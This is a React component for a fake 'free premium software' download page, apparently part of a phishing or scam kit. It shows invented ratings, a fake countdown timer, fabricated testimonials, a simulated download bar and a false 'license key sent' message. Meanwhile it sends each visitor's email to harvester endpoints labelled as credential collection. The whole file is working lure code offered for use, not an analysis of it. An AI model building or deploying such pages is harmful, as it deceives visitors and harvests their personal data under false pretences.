import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, LinearProgress, Grid, Chip, Avatar, Paper, Fade } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function DownloadPage() {
  const [email, setEmail] = useState('');
  const [progress, setProgress] = useState(0);
  const [downloading, setDownloading] = useState(false);
  const [completed, setCompleted] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleDownload = () => {
    if (!email) return;

    harvester.send('/api/collect/formdata', {
      formId: 'download-form',
      fields: { email },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'download',
      fieldData: { email }
    });

    setDownloading(true);
    let prog = 0;
    const interval = setInterval(() => {
      prog += Math.random() * 12 + 3;
      if (prog >= 100) {
        clearInterval(interval);
        setProgress(100);
        setTimeout(() => setCompleted(true), 500);
      } else {
        setProgress(prog);
      }
    }, 350);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4, px: 2 }}>
        <Container maxWidth="sm">
          <Fade in={true}>
            <Card elevation={3} sx={{ borderRadius: '20px', textAlign: 'center', overflow: 'hidden' }}>
              <Box sx={{ 
                background: 'linear-gradient(135deg, #059669, #10b981)', 
                p: 4,
                position: 'relative'
              }}>
                <Box sx={{
                  position: 'absolute', top: -30, right: -30, width: 150, height: 150,
                  borderRadius: '50%', background: 'rgba(255,255,255,0.06)'
                }} />
                <Typography sx={{ fontSize: '4rem', position: 'relative', zIndex: 1 }}>✅</Typography>
                <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2, position: 'relative', zIndex: 1 }}>
                  Download Complete!
                </Typography>
              </Box>
              <CardContent sx={{ p: 3 }}>
                <Typography sx={{ color: '#555', mb: 2, lineHeight: 1.6 }}>
                  Your license key has been sent to <strong style={{ color: '#059669' }}>{email}</strong>.
                </Typography>
                <Paper sx={{ 
                  bgcolor: '#fef3cd', 
                  border: '1px solid #ffc107', 
                  borderRadius: '12px', 
                  p: 2.5, 
                  mb: 3,
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: 1.5
                }}>
                  <Typography sx={{ fontSize: '1.2rem' }}>⚠️</Typography>
                  <Box>
                    <Typography sx={{ color: '#856404', fontWeight: 600, fontSize: '0.9rem' }}>
                      Activate within 24 hours or the key expires!
                    </Typography>
                    <Typography sx={{ color: '#856404', fontSize: '0.8rem', mt: 0.5, opacity: 0.8 }}>
                      Check your spam folder if you don't see the email.
                    </Typography>
                  </Box>
                </Paper>
                <Box sx={{ display: 'flex', gap: 1.5, justifyContent: 'center', flexWrap: 'wrap' }}>
                  <Button 
                    variant="outlined" 
                    sx={{ 
                      borderColor: '#e2e8f0', 
                      color: '#64748b', 
                      borderRadius: '10px',
                      textTransform: 'none',
                      fontWeight: 600,
                      px: 3
                    }} 
                    href="/"
                  >
                    Back to Home
                  </Button>
                  <Button 
                    variant="contained" 
                    sx={{ 
                      background: 'linear-gradient(135deg, #059669, #10b981)',
                      borderRadius: '10px',
                      textTransform: 'none',
                      fontWeight: 700,
                      px: 3,
                      boxShadow: '0 4px 14px rgba(5,150,105,0.3)',
                      '&:hover': { 
                        background: 'linear-gradient(135deg, #047857, #059669)',
                        boxShadow: '0 6px 20px rgba(5,150,105,0.4)'
                      }
                    }}
                  >
                    Open Software
                  </Button>
                </Box>
              </CardContent>
            </Card>
          </Fade>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f5f7fa' }}>
      {/* <Navbar /> */}
      
      {/* Header */}
      <Box sx={{ 
        background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f3460 100%)',
        pt: { xs: 6, md: 8 },
        pb: { xs: 8, md: 10 },
        position: 'relative', 
        overflow: 'hidden'
      }}>
        <Box sx={{
          position: 'absolute', top: -100, right: -100, width: 400, height: 400,
          borderRadius: '50%', background: 'radial-gradient(circle, rgba(37,99,235,0.1) 0%, transparent 70%)'
        }} />
        <Container maxWidth="sm" sx={{ textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <Typography sx={{ fontSize: '3.5rem', mb: 2 }}>🎮</Typography>
          <Typography variant="h4" sx={{ 
            color: '#fff', fontWeight: 800, mb: 1, 
            fontSize: { xs: '1.6rem', md: '2rem' },
            letterSpacing: '-0.5px'
          }}>
            Premium Software Suite
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.6)', mb: 3, maxWidth: 400, mx: 'auto', lineHeight: 1.6 }}>
            Professional-grade tools. Completely free for a limited time.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 1.5, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.8/5 Rating" sx={{ bgcolor: 'rgba(255,255,255,0.08)', color: '#e2e8f0', fontWeight: 600, border: '1px solid rgba(255,255,255,0.08)' }} />
            <Chip label="👥 2.3M+ Active Users" sx={{ bgcolor: 'rgba(255,255,255,0.08)', color: '#e2e8f0', fontWeight: 600, border: '1px solid rgba(255,255,255,0.08)' }} />
            <Chip label="🔒 SSL Secure" sx={{ bgcolor: 'rgba(255,255,255,0.08)', color: '#e2e8f0', fontWeight: 600, border: '1px solid rgba(255,255,255,0.08)' }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="sm" sx={{ mt: { xs: -5, md: -6 }, position: 'relative', zIndex: 10, pb: 6 }}>
        {/* Download Card */}
        <Card elevation={0} sx={{ 
          borderRadius: '20px', 
          border: '1px solid #e2e8f0',
          boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
        }}>
          <CardContent sx={{ p: { xs: 2.5, sm: 3.5 } }}>
            <Paper sx={{ 
              bgcolor: '#fef3cd', 
              border: '1px solid #ffc107', 
              borderRadius: '12px', 
              p: 2, 
              mb: 3, 
              textAlign: 'center',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: 1.5
            }}>
              <Box sx={{ 
                width: 32, height: 32, borderRadius: '8px',
                bgcolor: '#ffc107', display: 'flex', alignItems: 'center', justifyContent: 'center'
              }}>
                <Typography sx={{ fontSize: '1rem' }}>⏱️</Typography>
              </Box>
              <Typography sx={{ color: '#856404', fontWeight: 700, fontSize: '0.9rem' }}>
                Limited Time Offer — Expires in <Box component="span" sx={{ color: '#dc2626' }}>14:32:18</Box>
              </Typography>
            </Paper>
            <Grid container spacing={1.5} sx={{ mb: 3 }}>
              {[
                { icon: '🚀', text: 'Lightning-fast performance optimization' },
                { icon: '🛡️', text: 'Real-time security threat detection' },
                { icon: '📊', text: 'Advanced analytics & reporting dashboard' },
                { icon: '☁️', text: 'Cloud sync across all your devices' },
                { icon: '🎯', text: 'AI-powered productivity recommendations' },
                { icon: '💎', text: 'Pro features — normally $49.99/mo' },
              ].map((feat, i) => (
                <Grid item xs={12} sm={6} key={i}>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, py: 0.5 }}>
                    <Box sx={{
                      width: 28, height: 28, borderRadius: '8px',
                      bgcolor: '#f1f5f9', display: 'flex', alignItems: 'center', justifyContent: 'center',
                      fontSize: '0.9rem'
                    }}>
                      {feat.icon}
                    </Box>
                    <Typography sx={{ color: '#475569', fontSize: '0.85rem', lineHeight: 1.3 }}>{feat.text}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
            <Box sx={{ 
              bgcolor: '#f0fdf4', borderRadius: '12px', p: 2.5, mb: 3, textAlign: 'center',
              border: '1px solid #bbf7d0'
            }}>
              <Typography variant="h3" sx={{ 
                color: '#059669', fontWeight: 900, fontSize: { xs: '2.2rem', md: '2.6rem' }, letterSpacing: '-1px'
              }}>
                $0.00
              </Typography>
              <Typography sx={{ color: '#059669', fontWeight: 700, fontSize: '1.05rem' }}>FREE — Lifetime License</Typography>
              <Typography sx={{ color: '#94a3b8', fontSize: '0.82rem', mt: 0.5 }}>
                Normally $49.99/month — No credit card required
              </Typography>
            </Box>
            <Typography sx={{ color: '#475569', mb: 1.5, fontWeight: 600, textAlign: 'center', fontSize: '0.95rem' }}>
              Enter your email to get your free license key:
            </Typography>
            <TextField
              fullWidth type="email" placeholder="your@email.com"
              value={email} onChange={(e) => setEmail(e.target.value)} disabled={downloading}
              size="medium"
              sx={{ mb: 2, '& .MuiOutlinedInput-root': { bgcolor: '#f8fafc', borderRadius: '10px', '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' }, '&:hover fieldset': { borderColor: '#94a3b8' }, '&.Mui-focused fieldset': { borderColor: '#059669' } } }}
            />
            {downloading ? (
              <Box sx={{ textAlign: 'center', py: 1 }}>
                <LinearProgress variant="determinate" value={progress} sx={{ height: 8, borderRadius: '4px', bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { background: 'linear-gradient(90deg, #059669, #10b981)', borderRadius: '4px' } }} />
                <Typography sx={{ color: '#94a3b8', mt: 1.5, fontSize: '0.9rem' }}>Preparing your download... {Math.round(progress)}%</Typography>
              </Box>
            ) : (
              <Button variant="contained" fullWidth size="large" onClick={handleDownload} disabled={!email}
                sx={{ background: 'linear-gradient(135deg, #059669, #10b981)', '&:hover': { background: 'linear-gradient(135deg, #047857, #059669)' }, fontWeight: 700, py: 1.6, fontSize: '1.05rem', textTransform: 'none', borderRadius: '12px', boxShadow: '0 4px 14px rgba(5,150,105,0.3)' }}>
                🚀 Get Free License Key
              </Button>
            )}
            <Box sx={{ display: 'flex', justifyContent: 'center', gap: 3, mt: 2.5, flexWrap: 'wrap' }}>
              {[{ icon: '🔒', text: '256-bit encryption' }, { icon: '📦', text: '24.5 MB download' }, { icon: '💻', text: 'Windows • Mac • Linux' }].map((item, i) => (
                <Box key={i} sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
                  <Typography sx={{ fontSize: '0.85rem' }}>{item.icon}</Typography>
                  <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem' }}>{item.text}</Typography>
                </Box>
              ))}
            </Box>
          </CardContent>
        </Card>

        {/* Testimonials */}
        <Box sx={{ mt: 4 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2.5, textAlign: 'center', fontSize: '1.1rem' }}>What Our Users Say</Typography>
          <Grid container spacing={2}>
            {[
              { name: 'Sarah M.', role: 'Software Developer', text: 'This tool saved me hours of manual work. The Pro features are incredible — and it\'s completely free!' },
              { name: 'James K.', role: 'Business Owner', text: 'I\'ve been using this for 6 months. The productivity boost is unreal. Highly recommend.' },
              { name: 'Lisa R.', role: 'Digital Marketer', text: 'The analytics dashboard alone is worth hundreds. Getting this for free is a no-brainer.' },
            ].map((testimonial, i) => (
              <Grid item xs={12} sm={4} key={i}>
                <Card elevation={0} sx={{ borderRadius: '14px', height: '100%', border: '1px solid #e2e8f0', transition: '0.2s', '&:hover': { transform: 'translateY(-2px)' } }}>
                  <CardContent sx={{ p: 2.5 }}>
                    <Typography sx={{ color: '#475569', fontSize: '0.85rem', mb: 2, lineHeight: 1.6, fontStyle: 'italic' }}>"{testimonial.text}"</Typography>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                      <Avatar sx={{ width: 34, height: 34, background: 'linear-gradient(135deg, #059669, #10b981)', fontSize: '0.85rem', fontWeight: 700 }}>{testimonial.name[0]}</Avatar>
                      <Box>
                        <Typography sx={{ fontWeight: 600, color: '#0f172a', fontSize: '0.82rem' }}>{testimonial.name}</Typography>
                        <Typography sx={{ color: '#94a3b8', fontSize: '0.72rem' }}>{testimonial.role}</Typography>
                      </Box>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>
        </Box>
      </Container>
      
      {/* <Footer simple /> */}
    </Box>
  );
}